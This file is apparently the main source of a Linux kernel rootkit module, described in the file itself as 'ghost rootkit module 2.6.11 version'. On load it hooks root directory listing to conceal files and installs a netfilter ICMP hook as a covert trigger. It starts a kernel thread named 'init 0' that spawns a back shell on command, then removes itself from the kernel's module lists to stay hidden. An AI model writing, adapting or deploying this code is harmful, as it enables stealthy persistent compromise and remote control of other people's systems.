#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include "netfilter_hook.h"
#include "syscalltable.h"
#include "shellutil.h"
#include "vfs_hook.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("2y30r <ylbhz@hotmail.com>");
MODULE_DESCRIPTION("ghost rootkit module 2.6.11 version");

static int initable = 0;
void* shelldata = NULL;

static struct task_struct *tsk = NULL;
static int threadfn(void* args);
void module_hide(void);

static int ghost_init(void)
{
	if(-1 == (initable = sctable_init()))
		return printk(KERN_ALERT "syscalltable unloadable.\r\n");
	tsk = kthread_run(threadfn, NULL, "init 0");
	if(-1 == (initable = tsk == NULL ? -1 : 0))
		return printk(KERN_ALERT "kernel thread error.\r\n");
	
	do_hook_root_readdir();
	do_nf_icmp_hook();
	
	module_hide();

	return 0;
}

static void ghost_exit(void)
{
	if(-1 == initable)
		return;
	kthread_stop(tsk);
	do_unhook_root_readdir();
	do_nf_icmp_unhook();
}

module_init(ghost_init);
module_exit(ghost_exit);

static int threadfn(void* args)
{
	while(!kthread_should_stop())
	{
		set_current_state(TASK_UNINTERRUPTIBLE);

		if(shelldata != NULL)
		{
			kbackshell(shelldata);
			shelldata = NULL;
		}
		else
			schedule_timeout(HZ);
	}
	return 0;
}

void module_hide(void)
{
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}
